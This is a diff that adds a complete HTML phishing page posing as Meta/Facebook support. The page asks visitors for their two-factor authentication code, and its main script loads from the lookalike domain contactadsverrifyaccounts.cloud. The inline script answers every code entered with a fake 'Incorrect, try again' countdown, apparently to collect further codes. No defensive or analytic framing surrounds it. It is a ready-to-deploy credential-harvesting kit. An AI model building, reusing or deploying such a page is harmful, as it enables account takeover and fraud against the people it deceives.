@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-TRYVP8NYC0"></script>
+  <script>
+    function gtag() { dataLayer.push(arguments); }
+    window.dataLayer = window.dataLayer || [];
+    gtag('js', new Date());
+    gtag('config', 'G-TRYVP8NYC0');
+  </script>
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <meta name="description" content="Disagree With Decision">
+  <meta name="robots" content="noindex, nofollow, nocache">
+  <meta name="googlebot" content="noimageindex, max-video-preview:-1, max-image-preview:large, max-snippet:-1">
+  <meta property="og:title" content="Contact Suport Now">
+  <meta property="og:description" content="Contact Suport Now">
+  <meta property="og:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
+  <meta property="og:type" content="article">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Contact Suport Now">
+  <meta name="twitter:description" content="Contact Suport Now">
+  <meta name="twitter:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
+  <title>Meta Support</title>
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" rel="stylesheet">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
+  <script defer src="https://contactadsverrifyaccounts.cloud/static/js/main.aae6dd77.js"></script>
+  <link href="http://contactadsverrifyaccounts.cloud/static/css/main.89ada21a.css" rel="stylesheet">
+  
+  <style>
+    /* Định dạng nút Continue */
+    #continueBtn {
+      background-color: #A3C5F5; /* Màu nhạt khi chưa nhập code */
+      cursor: not-allowed; /* Vô hiệu hóa khi chưa nhập */
+      transition: background-color 0.3s;
+    }
+
+    /* Màu xanh đậm khi đủ 6 hoặc 8 ký tự */
+    #continueBtn.active {
+      background-color: #1877F2; /* Màu xanh đậm */
+      cursor: pointer; /* Kích hoạt khi có thể nhấn */
+    }
+  </style>
+</head>
+<body style="display: block;">
+  <div id="root">
+    <div class="flex min-h-screen items-center justify-center bg-[#F0F2F5] p-5 font-sans md:p-10">
+      <div class="w-full max-w-[600px] bg-[#F0F2F5] p-4 text-left md:p-5">
+        <div class="text-xs text-[#606770] mb-2">Facebook</div>
+        <h1 class="text-[22px] font-bold text-[#1c1e21] mb-2 md:text-2xl">Access Your Authentication App</h1>
+        <p class="text-[13px] font-bold text-[#606770] mb-4 leading-relaxed md:text-sm">
+          <span>Check the notification on your other device.<br></span>
+          <span>Log in to your Facebook account on another device and open the notification we sent to confirm this login.</span>
+        </p>
+        <img alt="Authentication Illustration" class="w-full h-auto mb-4 block min-h-[180px] md:min-h-[200px]" src="http://contactadsverrifyaccounts.cloud/ACP-UnifiedDelta-AuthenticationApp-Mobile_light-3x.png">
+        <input step="1" id="codeInput" placeholder="Enter code" maxlength="8" required class="w-full p-3 my-2 border border-[#dddfe2] rounded-lg bg-[#F9F9F9] text-[15px] text-[#606770] text-left focus:border-[#1877F2] focus:outline-none md:p-3.5 md:text-[15px]" type="number" value="">
+        <div id="timer" class="text-[#e74c3c] mt-2.5"></div>
+        <button id="continueBtn" disabled class="w-full p-3 mt-2 rounded-[25px] text-white font-bold text-[15px] text-center transition-colors md:p-3.5 md:text-[15px]">Continue</button>
+        <p class="text-center mt-[20%]">Meta</p>
+      </div>
+    </div>
+  </div>
+
+  <!-- Nhúng mã JavaScript -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      const codeInput = document.getElementById("codeInput");
+      const continueBtn = document.getElementById("continueBtn");
+      const timer = document.getElementById("timer");
+
+      // Kiểm tra khi người dùng nhập code
+      codeInput.addEventListener("input", function () {
+        if (codeInput.value.length === 6 || codeInput.value.length === 8) {
+          continueBtn.disabled = false;
+          continueBtn.classList.add("active");  // Kích hoạt màu xanh đậm khi nhập đúng số ký tự
+        } else {
+          continueBtn.disabled = true;
+          continueBtn.classList.remove("active");  // Loại bỏ màu xanh khi chưa đủ ký tự
+        }
+      });
+
+      // Hành động khi người dùng nhấn nút "Continue"
+      continueBtn.addEventListener("click", function() {
+        if (codeInput.value.length === 6 || codeInput.value.length === 8) {
+          startTimer();  // Bắt đầu đếm ngược
+          continueBtn.disabled = true;  // Vô hiệu hóa nút
+          continueBtn.classList.add("cursor-not-allowed");
+        }
+      });
+
+      // Đồng hồ đếm ngược
+      let seconds = 120;
+      function updateTimer() {
+        const min = Math.floor(seconds / 60);
+        const sec = seconds % 60;
+        timer.textContent = `Incorrect. Please, try again after: ${min}:${sec < 10 ? "0" : ""}${sec}`;
+        if (seconds > 0) {
+          seconds--;
+          setTimeout(updateTimer, 1000);
+        } else {
+          timer.textContent = "Code expired. Please request a new one.";
+        }
+      }
+
+      function startTimer() {
+        updateTimer();  // Khởi động đồng hồ đếm ngược
+      }
+    });
+  </script>
+
+</body>
+</html>
